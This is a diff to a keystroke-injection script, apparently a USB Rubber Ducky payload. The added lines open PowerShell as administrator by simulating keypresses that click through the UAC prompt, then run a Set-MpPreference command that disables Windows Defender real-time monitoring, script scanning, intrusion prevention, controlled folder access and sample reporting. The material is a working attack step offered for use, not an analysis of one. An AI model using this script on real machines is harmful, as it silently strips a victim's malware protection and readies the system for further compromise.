@@ -30,3 +30,20 @@ ENTER
 REM Close Settings
 DELAY 100
 ALT F4
+
+REM Open Powershell as Administrator (By passing only the UAC prompt not Password)
+GUI r
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 500
+LEFT
+LEFT
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Disable Windows Security Freatures
+STRING Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
+ENTER
+STRING exit
+ENTER
